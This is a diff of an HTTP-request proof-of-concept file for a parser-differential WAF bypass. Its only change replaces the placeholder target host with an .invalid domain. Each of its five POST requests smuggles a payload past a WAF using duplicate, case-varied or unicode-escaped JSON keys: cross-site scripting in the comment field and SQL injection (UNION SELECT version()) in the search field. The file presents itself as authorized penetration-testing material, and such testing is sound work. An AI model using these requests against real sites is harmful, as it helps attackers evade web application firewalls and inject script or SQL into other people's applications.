@@ -2,7 +2,7 @@
 # ============================================================================
 # Safe PoC -> x8bitranjit
 # JSON duplicate-key parser-differential WAF bypass (.http format).
-# Authorized testing only. WHAT TO EDIT: target.com + the endpoint.
+# Authorized testing only. WHAT TO EDIT: target.example.invalid + the endpoint.
 #
 # WHY IT WORKS: the WAF's JSON parser and the app's parser disagree on
 # duplicate keys - WAF validates the FIRST value ("safe"), the backend takes
@@ -11,36 +11,36 @@
 # ============================================================================
 
 ### 1) dup-key baseline (WAF sees "safe", app gets the payload)
-POST https://target.com/api/comment HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/comment HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"comment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}
 
 ### 2) dup-key SQLi variant
-POST https://target.com/api/search HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/search HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"id":"1","id":"1' UNION SELECT version()-- -"}
 
 ### 3) case-duplication (case-insensitive stacks: "Comment" vs "comment")
-POST https://target.com/api/comment HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/comment HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"Comment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}
 
 ### 4) unicode-escaped key + plain key (same normalized name)
-POST https://target.com/api/comment HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/comment HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"\u0063omment":"safe","comment":"<img src=x onerror=alert(document.domain)>"}
 
 ### 5) verify which value the APP saw (echo endpoint first)
-POST https://target.com/api/echo HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/echo HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"comment":"safe","comment":"app-parser-proof"}
